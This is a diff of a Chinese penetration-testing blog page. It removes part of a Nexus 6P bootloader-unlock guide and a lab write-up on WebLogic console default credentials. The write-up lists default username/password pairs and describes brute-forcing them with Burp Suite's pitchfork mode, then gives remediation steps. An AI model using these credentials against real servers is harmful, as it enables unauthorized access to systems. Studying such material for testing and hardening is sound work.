-<p>工具开启后会自动连adb到手机，这个时候USB调试一定得是打开的</p>
-<p>连通后选一下自己手机对应版本，nexus6p，build不知道直接选any就行，安卓版本是多少不用在意</p>
-<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706111516613.png" alt="image-20220706111516613"></p>
-<p>然后点unlock</p>
-<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706111634524.png" alt="image-20220706111634524"></p>
-<p>慢慢点确定，看到手机画面变了之后，不要点YES，直接点电源键（别按错），就会自动开始unlock</p>
-<p>然后解锁完成，重启的时候注意开机动画，Google的Logo下会有一个锁的标志，就证明解锁成功</p>
-<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706111847393.png" alt="image-20220706111847393"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/05/Weblogic-%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9A%B4%E9%9C%B2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/05/Weblogic-%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9A%B4%E9%9C%B2/" class="post-title-link" itemprop="url">Weblogic:控制台默认口令</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-05 00:18:34" itemprop="dateCreated datePublished" datetime="2022-07-05T00:18:34+08:00">2022-07-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
-<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1:7001//console%E7%AD%89%E7%B1%BB%E4%BC%BC%E9%93%BE%E6%8E%A5%E8%AE%BF%E9%97%AE%E5%88%B0%E6%8E%A7%E5%88%B6%E5%8F%B0">http://127.0.0.1:7001//console等类似链接访问到控制台</a></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用默认口令字典</p>
-<p>用户名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">weblogic</span><br><span class="line">admin</span><br><span class="line">joe</span><br><span class="line">mary</span><br><span class="line">system</span><br><span class="line">wlcsystem</span><br><span class="line">weblogic</span><br><span class="line">wlpisystem</span><br></pre></td></tr></table></figure>
-
-<p>密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password</span><br><span class="line">weblogic</span><br><span class="line">security</span><br><span class="line">password</span><br><span class="line">password</span><br><span class="line">security</span><br><span class="line">wlcsystem</span><br><span class="line">Oracle@123</span><br><span class="line">wlpisystem</span><br></pre></td></tr></table></figure>
-
-<p>使用burpsuite的pitchfork模式爆破，即用户名密码成对方式爆破，以上文默认口令为例，会以如下用户名密码组合爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:security</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1，更改weblogic默认口令</p>
-<p>2，尽量避免将weblogic后台向公网开放</p>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/414125709">https://zhuanlan.zhihu.com/p/414125709</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1364,7 +1376,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">50</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1408,7 +1420,7 @@
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共31.3k字</span>
+  <span class="post-count">博客全站共32.2k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
